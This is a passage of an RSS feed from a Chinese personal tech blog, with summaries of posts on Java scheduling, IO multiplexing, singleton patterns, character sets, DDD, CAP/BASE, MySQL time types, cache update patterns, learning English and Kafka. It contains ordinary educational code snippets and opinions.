价值 公司招聘工程师，就是为了解决问题、提供价值的。这句话可谓是充满了京东特色，因为“解决问题”，是老大的老大提出的，提供价值，是老大的老大的老大提出的。走出校园后，思维的一个变化点就是，之前总是从纯技术角度思考问题，喜欢使用复杂和高深的技术，觉得这更能体现工作价值，如今觉得，虽然技术很重要，但不能忽略业务，如果技术不能为业务创造价值，那么这个技术就没有价值(排除某些纯技术探索类项目)。技术，包括系统的设计和代码的编写，只是手段，不是目的。完成业务目标为第一，如果能够以更低的成本、更高的效率完成，那就更好了。工程师一定要业务和技术两条腿走路，业务为知，技术为行，知行合一，无往不利也。
(&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;知乎分割线&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;)
人在美国，刚下飞机(bushi)
这本书的风格偏向理论化的工程知识，没有用大量的笔墨来描述工程细节，其实这种书籍是一个陷阱，虽然内容读起来很流畅、阅读速度也较快、内容也很认同，但实际上最重要的是吸收了多少、落地实践了多少。正如当时在极客时间学习《设计模式之美》专栏时，每一个设计原则、设计原则都理解起来并不难，但是如何能够根据项目的实际场景，将这些东西恰到火候的应用落地，才是最难的。书中看似简单通俗的话语，其实是大佬们在互联网工程领域摸爬滚打20多年总结的智慧，简单就是终极的复杂，这种书籍，一定是常读常新的。很庆幸刚进入这个行业，就能够接触到这样的书籍，很庆幸能够现在有不是那么固执落后的认知，而知易行难，软件开发的领域也是完成符合10000小时定律的，这要踩很多的坑、要走很多的弯路、要打很多的仗，加油吧少年！</description>
    </item>
    
    <item>
      <title>Java定时任务调研</title>
      <link>https://hanchao666.top/posts/about-java-schedule-frame/</link>
      <pubDate>Tue, 23 Aug 2022 18:46:06 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/about-java-schedule-frame/</guid>
      <description>项目中使用到定时任务的场景很常见，例如凌晨跑一个定时T+1任务、系统每隔一段时间执行一段代码逻辑等，下面对Java领域常见的定时任务方案做一个水平调研，最佳打开方式就是选择当前业务场景下最为合适的一款~
单机定时任务选型 Timer java.util.Timer是 JDK 1.3 开始就已经支持的一种定时任务的实现方式。
Timer 内部使用一个叫做 TaskQueue 的类存放定时任务，它是一个基于最小堆实现的优先级队列。TaskQueue 会按照任务距离下一次执行时间的大小将任务排序，保证在堆顶的任务最先执行。这样在需要执行任务时，每次只需要取出堆顶的任务运行即可！
Timer 使用起来比较简单，通过下面的方式我们就能创建一个 1s 之后执行的定时任务。
// 示例代码： TimerTask task = new TimerTask() { public void run() { System.out.println(&amp;#34;当前时间: &amp;#34; + new Date() + &amp;#34;n&amp;#34; + &amp;#34;线程名称: &amp;#34; + Thread.currentThread().getName()); } }; System.out.println(&amp;#34;当前时间: &amp;#34; + new Date() + &amp;#34;n&amp;#34; + &amp;#34;线程名称: &amp;#34; + Thread.currentThread().getName()); Timer timer = new Timer(&amp;#34;Timer&amp;#34;); long delay = 1000L; timer.schedule(task, delay); //输出： 当前时间: Wed July 6 15:18:47 CST 2022n线程名称: main 当前时间: Wed July 6 15:18:48 CST 2022n线程名称: Timer 不过其缺陷较多，比如一个 Timer 一个线程，这就导致 Timer 的任务的执行只能串行执行，一个任务执行时间过长的话会影响其他任务（性能非常差），再比如发生异常时任务直接停止（Timer 只捕获了 InterruptedException ）。</description>
    </item>
    
    <item>
      <title>IO模式与select 、poll、epoll</title>
      <link>https://hanchao666.top/posts/io-select-poll-epoll/</link>
      <pubDate>Thu, 04 Aug 2022 18:41:29 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/io-select-poll-epoll/</guid>
      <description>五大IO模型 在Linux系统中，对于一次IO访问，数据会先被拷贝到操作系统内核的缓冲区中，然后才会从操作系统内核的缓冲区拷贝到应用程序的地址空间。所以，一个IO操作会经历两个阶段：
等待数据准备好 从内核向进程复制数据 基于此，Linux系统有五种IO模型：
阻塞式IO 非阻塞式IO IO复用 信号驱动式 异步IO 阻塞式IO 应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区才返回。
例如当用户进程调用了recvfrom这个系统调用，kernel就开始了IO的第一个阶段：准备数据。这个过程需要等待，因为数据从磁盘或网络被拷贝到内核的缓冲区是需要时间的，而用户进程这边，整个进程会被阻塞，当kernel中数据准备就绪，继续把kernel中的数据拷贝到用户内存，然后kernel结果，用户进程接触阻塞，重新run。
非阻塞IO 应用进程执行系统调用之后，内核返回一个错误码，应用进程可以继续执行，但是需要不断的轮询执行系统调用来获知IO是否完成。
IO复用 使用select或poll等待数据，并且可以等待多个套接字中的任何一个变为可读，这一过程会被阻塞，当某个套接字可读时返回，之后再使用recvfrom把数据从内核复制到进程中。她得基本原理就是select 、poll会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。它让单个进程具有处理多个IO事件的能力，又称为事件驱动。
如果一个服务器没有IO复用，那么每个socket连接都需要创建一个线程去处理，如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程或多线程技术，IO复用不需要进程线程创建和切换的开销，系统开销更小。
信号驱动IO 应用进程使用sigaction系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送SIGO信号，应用进程收到之后再信号处理程序中调用recvfrom将数据从内核复制到应用进程中。
异步IO 应用进程执行aio_read系统调用会立即返回，应用进程可以立即执行，不会被阻塞，内核会在完成所有操作之后向应用进程发送信号。异步IO与信号驱动IO的区别在于，异步IO的信号是通知应用进程IO完成，而信号驱动是通知应用进程开始IO。
比较 同步IO：将数据从内核缓冲区复制到应用进程缓冲区的阶段，应用进程会阻塞。 异步IO：第二阶段应用进程不会阻塞。 同步IO包括阻塞式IO、非阻塞IO、IO复用和信号驱动IO，他们第二阶段都会使应用进程阻塞，区别在于第一阶段，非阻塞IO、信号驱动在第一阶段不会阻塞，
而异步IO两个阶段都不会阻塞。
IO多路复用之select | poll | epoll select、poll、epoll都是IO多路复用的机制，IO多路复用就是通过一种机制，一个进程可以监视多个描述符，一旦某个描述符读写事件就绪，通知程序进行相应的读写操作。三者本质上都是同步IO，因为他们都需要在读写事件就绪后自己负责读写，这个读写过程是阻塞的，而异步IO则无需自己负责读写，其实现机制会完成数据从内核复制到用户空间，完成后通知应用进程即可。
select int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。
fd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。 timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。 成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。 fd_set fd_in, fd_out; struct timeval tv; // Reset the sets FD_ZERO( &amp;amp;fd_in ); FD_ZERO( &amp;amp;fd_out ); // Monitor sock1 for input events FD_SET( sock1, &amp;amp;fd_in ); // Monitor sock2 for output events FD_SET( sock2, &amp;amp;fd_out ); // Find out which socket has the largest numeric value as select requires it int largest_sock = sock1 &amp;gt; sock2 ?</description>
    </item>
    
    <item>
      <title>从Spring及Mybatis框架源码中学习设计模式(创建型)</title>
      <link>https://hanchao666.top/posts/learn-design-pattern-from-frame/</link>
      <pubDate>Tue, 12 Jul 2022 18:36:16 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/learn-design-pattern-from-frame/</guid>
      <description>设计模式是解决问题的方案，从大神的代码中学习对设计模式的使用，可以有效提升个人编码及设计代码的能力。本文主要看一下创建型的几个设计模式，即，单例模式、各种工厂模式 及 建造者模式。
单例模式 个人理解 确保某个类只有一个实例，并提供该实例的获取方法。实际应用很多，不管是框架、JDK 还是实际的项目开发，但大都会使用“饿汉式”或“枚举”来实现单例。“懒汉式”也有一些应用，但通过“双检锁机制”来保证单例的实现很少见。
实现方式 最简单的就是 使用一个私有构造函数、一个私有静态变量，以及一个公共静态方法的方式来实现。懒汉式、饿汉式等简单实现就不赘述咯，这里强调一下双检锁懒汉式实现的坑，以及枚举方式的实现吧，最后再结合 spring 源码 扩展一下单例 bean 的实现原理。
1. 双检锁实现的坑
/** * 双检锁 懒汉式，实现线程安全的单例 * 关键词：JVM指令重排、volatile、反射攻击 */ public class Singleton3 { /** * 对于我们初级开发来说，这个volatile在实际开发中可能见过，但很少会用到 * 这里加个volatile进行修饰，也是本单例模式的精髓所在。 * 下面的 instance = new Singleton3(); 这行代码在JVM中其实是分三步执行的： * 1、分配内存空间； * 2、初始化对象； * 3、将instance指向分配的内存地址。 * 但JVM具有指令重排的特性，实际的执行顺序可能会是1、3、2，导致多线程情况下出问题， * 使用volatile修饰instance变量 可以 避免上述的指令重排 * tips：不太理解的是 第一个线程在执行第2步之前就已经释放了锁吗？导致其它线程进入synchronized代码块 * 执行 instance == null 的判断？ * 回答：第一个线程在执行第2步之前就已经释放了锁吗？（没有）。如果不使用volatile修饰instance变量，那么其他线程进来的时候，看到的instance就有可能不是null的，因为已经执行了第3步，那么此时这个线程（执行 return instance;）使用的instance是一个没有初始化的instance，就会有问题。 */ private volatile static Singleton3 instance; private Singleton3(){ } public static Singleton3 getInstance(){ if(instance == null){ synchronized(Singleton3.</description>
    </item>
    
    <item>
      <title>关于字符集</title>
      <link>https://hanchao666.top/posts/about-charset/</link>
      <pubDate>Fri, 24 Jun 2022 18:38:50 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/about-charset/</guid>
      <description>何为字符集？ 字符是各种文字和符号的统称，包括各个国家文字、标点符号、表情、数字等等。 字符集 就是一系列字符的集合。字符集的种类较多，每个字符集可以表示的字符范围通常不同，就比如说有些字符集是无法表示汉字的。
计算机只能存储二进制的数据，那英文、汉字、表情等字符应该如何存储呢？
我们要将这些字符和二进制的数据一一对应起来，比如说字符“a”对应“01100001”，反之，“01100001”对应 “a”。我们将字符对应二进制数据的过程称为&amp;quot; 字符编码 &amp;ldquo;，反之，二进制数据解析成字符的过程称为“ 字符解码 ”。
有哪些常见的字符集？ 常见的字符集有 ASCII、GB2312、GBK、UTF-8&amp;hellip;&amp;hellip;。
不同的字符集的主要区别在于：
可以表示的字符范围 编码方式 ASCII ASCII (American Standard Code for Information Interchange，美国信息交换标准代码) 是一套主要用于现代美国英语的字符集（这也是 ASCII 字符集的局限性所在）。
为什么 ASCII 字符集没有考虑到中文等其他字符呢？ 因为计算机是美国人发明的，当时，计算机的发展还处于比较雏形的时代，还未在其他国家大规模使用。因此，美国发布 ASCII 字符集的时候没有考虑兼容其他国家的语言。
ASCII 字符集至今为止共定义了 128 个字符一个 ASCII 码长度是一个字节也就是 8 个 bit，比如“a”对应的 ASCII 码是“01100001”。不过，最高位是 0 仅仅作为校验位，其余 7 位使用 0 和 1 进行组合，所以，ASCII 字符集可以定义 128（2^7）个字符。
由于，ASCII 码可以表示的字符实在是太少了。后来，人们对其进行了扩展得到了 ASCII 扩展字符集 。ASCII 扩展字符集使用 8 位（bits）表示一个字符，所以，ASCII 扩展字符集可以定义 256（2^8）个字符。
GB2312 我们上面说了，ASCII 字符集是一种现代美国英语适用的字符集。因此，很多国家都捣鼓了一个适合自己国家语言的字符集。
GB2312 字符集是一种对汉字比较友好的字符集，基本涵盖了绝大部分常用汉字。不过，GB2312 字符集不支持绝大部分的生僻字和繁体字。对于英语字符，GB2312 编码和 ASCII 码是相同的，1 字节编码即可。对于非英字符，需要 2 字节编码。</description>
    </item>
    
    <item>
      <title>对于应用架构的胡思乱想</title>
      <link>https://hanchao666.top/posts/think-about-ddd/</link>
      <pubDate>Fri, 03 Jun 2022 18:34:08 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/think-about-ddd/</guid>
      <description>应用架构，指软件系统中固定不变的代码结构、设计模式、规范和组件间的通信方式。如今在业务研发时往往会更关注宏观上的架构，而忽略了应用内部的架构设计。个人觉得应用内部架构存在更多的细节，也更能体现程序员的功力所在。
基于controller、service、dao进行分层的开发模式在现在的应用架构中占据主流，但究其本质是在使用面向对象的语言，写着面向过程的方法。面向过程的好处是符合我们大脑的思考方式，实现起来简单快捷，并且在业务系统发展初期从0到1的过程，为了业务的抢占以及减少试错成本，是非常实用的。但是从长远来看，传统MVC的service代码无复用性，也不具备比较好的可维护性，这里的可维护性包括外部依赖的影响、新功能扩展以及可测试性等。在软件开发领域，每个service中面向过程的方法都叫做“事务脚本编程”，而在应用架构中，我们需要保证系统能够快速平稳的进行迭代，保证整体的加速度平稳，而传统MVC一旦面临较大的改动，由于存在外部依赖严重等情况，就可能面临着整体重构的风险，这也就是为什么如今项目在发展过程中开发周期逐渐变长的原因，所以作为有追求的开发者，我们应该探索一套高质量的业务响应模型，来尽可能的减少系统腐败的可能性。
在传统的开发模式中，我们最大的问题就是视角被底层数据存储系统束缚，因为我们太重视数据了，每个业务系统其实只在做两件事情：计算数据、存储数据。数据是企业的核心资产，所以我们一般从数据库建模开始，来设计一个业务系统。从这个角度出发，其实我们的应用层代码也不过是具备灵活自定义属性的数据库事务脚本，可对于业务系统来讲，不管是2B还是2C，业务需求的不确定性是其基本特征，在后续的需求迭代中，如果加入了新的需求，我们可能就会面临着之前的事务脚本不能复用，我们还需要更改底层存储结构，可能需要维护两套事务脚本，甚至整体重构，这非常可怕。每次我们的系统都是从0到1开始，有多可怕，就像我们玩一个游戏没有存档功能一样，每次都从头开始的话，我们能受得了吗？对于提倡降本提交的资本家来说，能受得了吗？所以需要变革。
我们之前的关注点失焦了，作为业务系统，其第一关注点应该是业务模型，不能被外部所影响，这里的外部包括客户端形态、外部依赖稳定性以及数据存储组件，都不应该影响我们的业务模型。以业务模型为核心结构，所有的客户端调用、数据持久化、中间件其实都是系统的IO外围，在业务模型的最外层可以增加适配层，来对抗外部环境的变化，下面来一张大师的架构图：
这种以业务模型为核心驱动的开发模式即DDD(领域驱动设计)，DDD不是一个专门的架构，而是任何传统代码在模型划分清晰、充分落实设计原则之后的必然形态。
谈一下DDD的一些概念。DDD会根据实际的业务场景进行建模，不考虑非业务相关的元素，每个Entity都应一个业务实体，Repository负责实体的持久化，而具体的持久化方式是基于相应的实现类，假如我们采用了常用Mybatis，只需实现Repository接口即可，在实现类里面进行Entity到DO的封装转化，并调用DAO进行真正的存储。一旦ORM框架发生变更或底层数据结构发生改变，那么替换为其他实现类即可。
传统开发的第一步是数据库建模，而DDD中需要进行领域建模。首先进行时事件风暴，根据一些业务操作和行为找出实体和值对象。实体和值对象是基础的领域对象，实体一般对应业务对象，它具有业务属性和业务行为；而值对象主要是属性集合，对实体的状态和特征进行描述。但实体和值对象都是个体化的对象，表现出来的是个体的能力。而业务是整体性的，每个实体相当于社会上的一个个人，但社会上都是以组织的形式存在的，例如一个班级、一个公司，所以实体也是需要合作的。所以出现了聚合的概念，聚合由业务和逻辑紧密关联的实体和值对象组成，是数据修改和持久化的基本单元，可以把每个聚合类比为k8s中的pod，属于逻辑分组范畴。
聚合有聚合根和限界上下文，这个边界根据业务单一职责和高内聚原则，聚合之间的边界是松耦合的，所以根据聚合设计出来的系统是高内聚低耦合的。聚合在DDD分层架构中属于领域层，领域层包含了多个聚合，共同实现核心业务逻辑。聚合内实体以充血模型实现个体业务能力，以及业务逻辑的高内聚。跨多个实体的业务逻辑通过领域服务实现，跨多个聚合的业务逻辑通过应用服务来实现。比如有的业务场景需要同一个聚合的A和B两个实体来共同完成，我们就可以将这段业务逻辑用领域服务来实现，而有的业务逻辑需要通过聚合C和D中的两个服务来实现，那么就用应用服务来组合这两个服务。
聚合根。
班级有班主任，公司有老板，聚合有聚合根。聚合根也叫根实体，他不仅是实体，也是聚合的管理者。如果业务模型中的每个实体都是对等的，任由实体进行无控制的调用和数据修改，很可能导致实体之间数据逻辑的不一致。采用锁的方式会增加软件的复杂度，也会降低系统的性能。聚合根在聚合内部负责协调实体和值对象按照固定的业务规则系统完成共同的业务逻辑。最后在聚合之间，他还是聚合对外的接口人，以聚合根id关联的方式接受外部任务和请求，在上下文内实现聚合之间的业务协同。也就是说，聚合之间通过聚合根id关联引用，如果需要访问其他聚合的实体，就要先访问聚合根，再导航到聚合内部实体，外部对象不能直接访问聚合内实体。
知易行难，理论派的口嗨就到这里了，我们每个开发者能够做的就是心中对代码质量有追求，不断的实践摸索，愿我们都能写出优雅如诗的代码！</description>
    </item>
    
    <item>
      <title>分布式系统一致性和可用性的权衡方法论</title>
      <link>https://hanchao666.top/posts/distributed-system-consistency-avalibility/</link>
      <pubDate>Thu, 12 May 2022 18:25:35 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/distributed-system-consistency-avalibility/</guid>
      <description>0.理论基础：CAP和BASE CAP理论 理论出处：https://groups.csail.mit.edu/tds/papers/Gilbert/Brewer2.pdf
什么是CAP 指的是在一个分布式系统中，Consistency（一致性）、 Availability（可用性）、Partition tolerance（分区容错性）这三个基本需求，最多只能同时满足其中的2个。
一致性：数据在多个副本之间能够保持一致的特性 可用性：系统提供的服务一直处于可用的状态，每次请求都能获得正确的响应。 分区容错性：分布式系统在遇到分区故障的时候，仍然能够对外提供服务。 什么是分区？
在分布式系统中，不同的节点可能分布在不同的机房或子网络中，由于不可避免的故障，例如机器损坏、网络分区等，这些节点之间就会出现无法通信的情况，导致整个系统的环境被分离开来，出现分区。
上面已经提过，在分布式系统中，C、A、P三种特性最多只能选择两种。但这道选择题就像别人在问你“小明的父亲有三个孩子，老大叫大朗，老二叫二郎，请问老三叫什么”一样。在以分布式存系统为限定条件的 CAP 世界里，P 是早已经确定的答案，P 是必须的。
因为，在分布式系统内，P 是必然的发生的，不选 P，一旦发生分区错误，整个分布式系统就完全无法使用了，这是不符合实际需要的。所以，对于分布式系统，我们只能能考虑当发生分区错误时，如何选择一致性和可用性。而根据一致性和可用性的选择不同，开源的分布式系统往往又被分为 CP 系统和 AP 系统。
当一套系统在发生分区故障后，客户端的任何请求都被卡死或者超时，但是，系统的每个节点总是会返回一致的数据，则这套系统就是 CP 系统，经典的比如 Zookeeper。
如果一套系统发生分区故障后，客户端依然可以访问系统，但是获取的数据有的是新的数据，有的还是老数据，那么这套系统就是 AP 系统，经典的比如 Eureka。
用大白话来形容下 CAP ，CAP 就是告诉程序员们当分布式系统出现内部问题了，你要做两种选择：
要么迁就外部服务，像外包公司。 要么让外部服务迁就你，像银行。 迁就外部服务就是我们不能因为我们自己的问题让外部服务的业务运行受到影响，所以要优先可用性。而让外部服务迁就我们，就要优先一致性。所以我们还是要在具体的情景内进行权衡。
BASE理论 BASE 是 Basically Available（基本可用） 、Soft-state（软状态） 和 Eventually Consistent（最终一致性） 三个短语的缩写。
基本可用 什么是基本可用呢？假如系统出现了不可预知故障，允许损失部分可用性，当然也不能完全不可用。
损失的这部分可用性指的是什么？
1.响应时间上的损失 ：正常情况下的搜索引擎0.5秒即返回给用户结果，而基本可用的搜索引擎可以在2秒作用返回结果。
2.功能上的损失 ：在一个电商网站上，正常情况下，用户可以顺利完成每一笔订单。但是到了大促期间，为了保护购物系统的稳定性，部分消费者可能会被引导到一个降级页面。
软状态 软状态指允许系统中的数据存在中间状态（CAP 理论中的数据不一致 ），并认为该中间状态的存在不会影响系统的整体可用性，即允许系统在不同节点的数据副本之间进行数据同步的过程存在延时。
最终一致性 最终一致性强调的是系统中所有的数据副本，在经过一段时间的同步后，最终能够达到一个一致的状态。因此，最终一致性的本质是需要系统保证最终数据能够达到一致，而不需要实时保证系统数据的强一致性。
BASE 理论是对 CAP 中一致性 C 和可用性 A 权衡的结果，其核心思想是：</description>
    </item>
    
    <item>
      <title>谈谈数据库如何存储时间</title>
      <link>https://hanchao666.top/posts/how-db-store-time/</link>
      <pubDate>Mon, 18 Apr 2022 18:22:01 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/how-db-store-time/</guid>
      <description>水一篇短小精悍的文章。
平时开发中不可避免的就是在数据库中进行时间的存储，比如说记录的创建时间、更新时间等等。底层数据结构的选型对于系统来说至关重要，那么下面探索一下这种场景的方法论。
1.不要用字符串存储日期 这种方式有点还是有的，就是简单方便，什么数据都可以丢给字符串，然后直接塞到库里面。但是这种做法主要有下面两个问题：
字符串的占用空间更大 字符串存储的日期效率比较低(逐个字符进行比对)，无法用日期相关的API进行计算和比较 所以还是不要用。
2.Datetime or Timestamp? Datetime 和 Timestamp 是 MySQL 提供的两种比较相似的保存时间的数据类型。他们两者究竟该如何选择呢？
通常是选用的TimeStamp的，下面说一下理由。
理由1 DateTime类型是没有时区信息的(时区无关)，其保存的时间是当前会话所设置的时区对应的时间，这样当时区进行更换时，比如服务器更换地址或者更换客户端连接时区设置的话，就会导致从数据库中度出的时间错误。
而TimeStamp和时区有关。其类型字段的值会随着服务器时区的变化而变化，自动换算成相应的时间，说简单点就是在不用时区，查询到同一条记录时间字段的值是不同的。
例如：
建表 SQL 语句
CREATE TABLE `time_zone_test` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `date_time` datetime DEFAULT NULL, `time_stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 插入数据
INSERT INTO time_zone_test(date_time,time_stamp) VALUES(NOW(),NOW()); 查看数据：
select date_time,time_stamp from time_zone_test; 结果：
+---------------------+---------------------+ | date_time | time_stamp | +---------------------+---------------------+ | 2020-01-11 09:53:32 | 2020-01-11 09:53:32 | +---------------------+---------------------+ 修改对话时区：</description>
    </item>
    
    <item>
      <title>缓存更新的三种模式</title>
      <link>https://hanchao666.top/posts/three-cache-way/</link>
      <pubDate>Sun, 03 Apr 2022 17:36:04 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/three-cache-way/</guid>
      <description>计算机世界的很多难题都可以使用中间层的思想解决。在一个业务系统中，最耗费性能的通常是最后端的数据库，服务器和数据库的磁盘IO开销，一般都是业务系统最大的性能短板，所以这一部分的性能优化，就显得尤为重要。如果使用中间层的思想解决这个问题，那么加入缓存就是非常经典的落地案例。在数据库的增删改查中，select 通常是最容易出问题的操作，因为绝大多数业务系统基本都是读多写少的，而insert、update、delete由于索引的存在，不太会出现性能问题。下面分别介绍三种常用的缓存设计模式：
1. Cache Aside更新模式 其逻辑如下：
读：如果命中缓存，那么直接返回数据、如果没命中，那么直接去库里面取，成功后放到缓存中 写：直接更新数据库，并令缓存失效 在写操作更新缓存中，Cache Aside使用的是直接令缓存失效，而不是更新缓存，为什么要这么做呢？
考虑在并发写的情况下，A、B都要执行更新操作，A先执行了更新数据库操作，因为两个写操作可能存在数据量差异以及需要进行锁表，可能存在写速度上的不一致，最终出现下面的执行顺序：
A更新数据库 - B更新数据库 - B更新缓存 - A更新缓存
如此一来，那么缓存中就存在脏数据的情况。
那么Cache Aside的这种模式一定是安全的吗？不是的。如果A操作执行了读操作，没有命中缓存，那么去数据库里面读取，这时操作B执行写操作，写成功之后令缓存失效，然后A操作拿到读取到旧数据更新缓存，这种情况下，还是存在脏数据的可能性。其时序图如下：
但是这种情况发生的概率很低，如果发生，需要满足一下三个条件：
读操作读取Cache时，此时Cache刚好失效 写操作执行速度要比读操作执行快 读操作的更新缓存要在写操作删除缓存之后 虽然发生的概率极低，但是不代表问题不存在。如何解决呢？三种方式：
使用2PC(影响速度) 使用Paxos or Raft(增加复杂性) 接受(尽最大可能降低并发时脏数据的概率，并给缓存设置合理的过期时间) 目前FaceBook就是采用了第三种解决方式，虽然牺牲了数据百分之百的一致性，但是换来了系统的高性能，也是一种Trade Off，具体参考：《Scaling Memcache at Facebook》
2. Read/Write Through更新模式 这个模式使用了工具类的思想，对内封装了缓存一致性的复杂度，对外暴露的简单的调用接口，应用层不需要主动实现数据一致性，只需要把缓存和数据库理解为绑定在一起的数据存储服务即可。
具体实现逻辑：
读：当缓存失效时(过期或LRU)，在Cache Aside中，更新缓存的操作由调用方实现，但是在Read Through中缓存服务自己来实现，对调用方来讲，这个过程是透明的。 写：如果没有命中缓存，那么更新数据库；如果命中，那么直接更新缓存，并由缓存服务同步更新数据库。 3. Write Behind Caching更新模式 基本逻辑图：
Write Behind利用了Linux操作系统的Page Cache原理，在更新数据的时候，只更新缓存，然后让缓存来异步的更新数据库，这个过程都是直接操作内存，当异步进行更新数据库时，Write Behind还可以合并对同一数据的批量操作，所以这种模式速度快的飞起，但是却牺牲了数据的强一致性，因为数据都是放在内存中，一旦系统异常被kill，那么会导致数据的丢失，这和Linux系统异常关机，会导致数据丢失是一个道理。同时这个更新模式也具有一定的复杂度，我们需要track哪些内存是被修改过的脏页，并维护起来。在软件设计上，鱼和熊掌不可兼得，总是要作出一些取舍，来设计出符合我们业务场景的、最能接收的&amp;quot;最佳&amp;quot;设计。
4. 其他 目前的数据库缓存基本使用搭建Redis集群的方式实现，一方面是由于Redis自身的强大特性，另一方面，在容器服务上如果放置本地缓存，是行不通的。可能由于本地缓存的机器内存不够大，另外本地缓存由于让容器服务带上了数据属性，服务有了状态，不方便进行水平扩容等管理措施。 缓存时间不宜过长或过短，这个需要我们根据具体的业务场景，来做一个合理的设置。如果缓存时间过短，那么会频繁的从数据存储中检索数据，如果过长，会导致数据长期留存在内存中，浪费资源。 很多缓存系统都使用LRU这种淘汰策略，需要在key-value这样的非顺序存储结构中，维护一个顺序的存储结构，来保证内存排序的优先级。LRU在读写是都是需要加锁的(单线程除外)，这个加锁操作可能会导致更慢的存取时间，需要注意。 爬虫影响 爬虫是无处不在的，爬虫可能会让一些非热点数据，占据我们的内存，这会降低业务系统热点数据的缓存命中率。一般这种情况，我们可能需要加上爬虫保护机制，或者是引导爬虫访问专门的api，做一个分流，对业务系统是一套缓存机制，对爬虫是一套机制。 真的要加缓存嘛 任何一个新技术组件的引入，都会增加系统整体的复杂度。尽管他能够给我们带来一定的收益，但是随着而来的也会带来隐患。拿缓存来说，他固然可以提高业务系统的存取速率与响应时间，但是带来了维护缓存一致性的复杂。得到的是性能提升，失去的是系统的强一致性。所以一定要做好需求调研，看是否需要引入。 </description>
    </item>
    
    <item>
      <title>我对程序员英语的思考和规划</title>
      <link>https://hanchao666.top/posts/my-programmer-english-thought/</link>
      <pubDate>Sat, 12 Mar 2022 18:20:10 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/my-programmer-english-thought/</guid>
      <description> 写博客以来，内容都是纯技术文章，还没发表过思考方法论的文章，这是第一篇。博客的目的就是沉淀思考，不管技术还是生活，道理都是相通的，一花一木，亦是哲学。
思考 信息传播上来讲，
计算机的源头是西方，计算机的通用语言是英语，在计算机设计以及技术产生之初，是没有考虑我们中国人的使用的。在编码方式上，一开始的计算机只有单字节的ASCII码，并不支持汉字，直到GB2312的出现；在技术框架上，一开始只有英文文档，直到有人开始搬运翻译，继续提供给不懂英语的码农使用。
在声音传播中，有一个信噪比的概念：一般来说，信噪比越大，说明混在信号里的噪声越小，声音回放的音质量越高，否则相反。这个概念在信息传播过程中同样适用。技术的源头是西方，我们是受众，那么如何提高信息知识的信噪比，是我们最应该关注的事情。一旦知识中掺杂着“噪声”，那么我们接收的可能就是失真或者扭曲的知识。
在《王牌对王牌》中，有一个传送门的节目:
第一个演员看到真正的词语(信息源)，把自己理解的内容通过动作向后传播，后面的人继续重复这个步骤，直到最后一个人看完前一个人操作完成之后，说出他所理解的词语，而这个词语，往往和真正的词语八竿子都打不着了。这个过程，就是信息在传播中失真的过程。
而我们要做的，就是提高信噪比，让自己接近信息源。
功利上来讲，
英语水平，更精细化一些，英语的读写水平，是一个程序员的必备技能，也决定着程序员的天花板。技术的发展日新月异，
注：21世纪以来底层技术突破不大，但封装程度更高、更易用的框架层出不穷
每年都在涌现一批批的技术名词、一批批的优秀框架，持续学习也是程序员的必备技能之一，如果我们一味的依赖他人翻译过来的的中文资料，或者通过百度CSDN，那无异于等待他人投喂，吃嗟来之食。为什么不把主动权控制在自己手里面呢？并且国外有更加活跃高质量的开源社区，例如Github、stackoverflow，这里单独对比一下stackoverflow和csdn，首先在机制上，stackoverflow的设计理念是每个类型的问题只有一个的，不能重复发表低质量无一亿的帖子，而csdn，各种复制粘贴来的帖子漫天飞。从个人使用体验上来讲，问题粘贴到stackoverflow上，就是比csdn上解决的效率更高一些。
鉴于博客寥寥无几的访问量，说点电视不让播的。提高英语水平，我们能够体验到墙外的文化。在新闻获取上，古人云兼听则明，有些新闻，国内国外一起结合着来看，更好一些，也不要只看新闻联播~多门手艺多条路，以后外企是不是也是一个很好的选择呢？
规划 得益于付费主题的加密功能，已经将这篇文章设置为密码访问了~
英语是一门技能，并不是一种知识，知识的获取在于理解吸收，而技能的提升，在于千锤百炼。千锤百炼，最重要的是坚持，接下来是人类共同面对的问题，如何坚持？
人的大脑都是趋向于安逸和慵懒的，而日复一日的坚持一件不能让自己感觉到爽的事情，这不就是自虐吗？
所以，我的方案是采用万能的分治，分段式坚持。什么叫分段式坚持，也就是阶段性总结复盘，并给自己一些小奖励，能够让自己感觉到，真的变牛逼了。拿跑步来讲，我当初坚持下来的一个直接原因，就是每个月月底的跑步数据，还有日语老师对于我的夸奖哈哈哈，所以，同样也适用于英语。
在具体的举措上：
非紧急情况下，使用英文进行Google搜索 非紧急情况下，使用英英翻译 坚持阅读英文技术书籍，当前目标书籍：《代码大全》 使用英文进行代码注释以及commnit message </description>
    </item>
    
    <item>
      <title>Kafka为什么性能这么牛？</title>
      <link>https://hanchao666.top/posts/why-kafka-niubility/</link>
      <pubDate>Tue, 01 Mar 2022 18:18:40 +0800</pubDate>
      
      <guid>https://hanchao666.top/posts/why-kafka-niubility/</guid>
      <description>Apache Kafka是一个高性能的消息队列，在目前众多消息队列产品中，Kafka的性能绝对是第一梯队的，且Kafka也是大数据生态的组件，背书很硬。下面来看一下，Kafka是如何达到高性能表现的。
全异步化的线程模型
